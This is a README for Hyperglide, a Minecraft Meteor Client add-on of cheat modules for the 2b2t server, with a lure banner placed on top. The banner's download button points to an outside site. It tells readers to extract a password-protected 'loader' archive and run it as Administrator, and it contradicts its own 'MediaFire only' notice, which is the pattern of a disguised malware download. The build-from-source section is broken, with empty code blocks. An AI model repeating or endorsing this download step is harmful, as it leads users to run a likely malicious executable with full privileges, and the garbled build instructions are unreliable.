<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

<p>
  <img src="icon.png" alt="Hyperglide" width="192">
</p>

<h3>Hyperglide</h3>

<p><i>A Meteor Client add-on focused on utility modules for the 2b2t server.</i></p>

[![License][shield-repo-license]][repo-license]
[![Latest Release][shield-repo-latest]][repo-latest]
[![Stars][shield-repo-stargazers]][repo-stargazers]
[![Downloads][shield-repo-releases]][repo-releases]
[![Forks][shield-repo-forks]][repo-forks]

<br>

## 📖 About

A [Meteor Client][meteor] add-on for the 2b2t anarchy server, providing practical utility and automation modules.

## 📦 Requirements

- **[Minecraft 1.21][minecraft]**
- **[Fabric Loader][fabric]**
- **[Meteor Client][meteor]**
- **[Baritone][baritone]**

It is recommended to download Baritone from the official GitHub repository using link above.<br>
Find the release matching your version and download `baritone-api-fabric-<version>.jar`.

Alternatively, use the corresponding Baritone library included in the `/libs` folder.

## 🧩 Modules

- **Air Place** - Allows blocks to be placed in the air without requiring the adjacent surface
- **Auto Pilot** - Automatically navigates through the nether using calculated travel route
- **Auto Web** - Places cobwebs around selected entities with optional movement prediction
- **Block Farm** - Automates placing and breaking blocks for extremely fast repeated farming
- **Bounce Fly** - Uses elytra bouncing for fast highway travel with optional obstacle passing
- **Control Fly** - Provides controlled elytra flight with automatic stabilization and boosting
- **Deep Trace** - Highlights unusual dropped items and dungeon mobs below the surface
- **Easy Access** - Opens hidden containers and supported interactive entities within range
- **Elytra Tweaks** - Adds automatic elytra swap, takeoff, recovery and collision protection
- **Fast Frame** - Automatically fills nearby empty item frames using items from your hotbar
- **Fast Portal** - Builds nearby nether portals in the direction you're facing and lights them
- **FD3 Crafter** - Strictly crafts all FD3 firework rockets from available inventory ingredients
- **Force Log** - Disconnects when a whitelisted player sends the configured whisper message
- **Mining Tweaks** - Enables packet mining, including fast remine and double-break support
- **Navigation** - Provides a map of the nether highway network with interactive route planning
- **No Coord Leak** - Prevents chat message containing coordinates from being sent by accident
- **No Sprint FOV** - Removes vanilla sprinting zoom effects for a more consistent field of view
- **Overview** - Displays a content icon on shulker boxes and bundles for quick identification
- **Raid Starter** - Automatically drinks ominous bottles to start the raid for repeated farming
- **Rocket Boost** - Enhances firework rocket acceleration during elytra flight for faster travel
- **Scaffolding** - Places selected blocks beneath and ahead of the player for safer bridging
- **Self Trapper** - Builds a configurable block trap around the player with queued placements
- **Trigger Bot** - Attacks selected entities under the crosshair, including targets through walls

## 📁 Project Structure

```text
Hyperglide/
├── gradle/                              # Gradle wrapper files
├── libs/                                # Local dependencies
│   ├── baritone-api-fabric-1.13.1.jar
│   └── baritone-api-fabric-1.17.0.jar
├── src/
│   ├── main/
│   │   ├── java/hyperglide/
│   │   │   ├── hud/                     # HUD modules
│   │   │   ├── mixin/                   # Mixin classes
│   │   │   ├── modules/                 # Client modules
│   │   │   ├── navigation/              # Route planning
│   │   │   ├── utilities/               # Utility classes
│   │   │   └── Hyperglide.java          # Main entry point
│   │   └── resources/
│   │       ├── assets/hyperglide/
│   │       │   └── icon.png
│   │       ├── fabric.mod.json
│   │       └── mixins.json
│   ├── 1.21.4/
│   │   └── java/hyperglide/
│   │       ├── mixin/                   # Target mixins
│   │       └── utilities/               # Target helpers
│   └── 1.21.11/
│       └── java/hyperglide/
│           ├── mixin/                   # Target mixins
│           └── utilities/               # Target helpers
├── build-all.bat
├── build.gradle
├── gradle.properties
├── settings.gradle
├── gradlew
├── gradlew.bat
├── icon.png
├── LICENSE
└── README.md
```

## 🛠️ Building from Source

### Prerequisites

- **[JDK 21 or newer][java]**
- **[Git][git]**

### Windows

Clone the repository:

```powershell
### Linux and macOS

Clone the repository:

```bash
### Output

The compiled add-on JARs will be located in:

```text
build/libs/
```

## 🐛 Issues and Suggestions

Found a bug or have an idea?

- [Report a bug][repo-issues]
- [Suggest a feature][repo-issues]
- [Open a pull request][repo-pulls]

## 📄 License

This add-on is licensed under the [GNU General Public License v3.0][repo-license].


---

GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
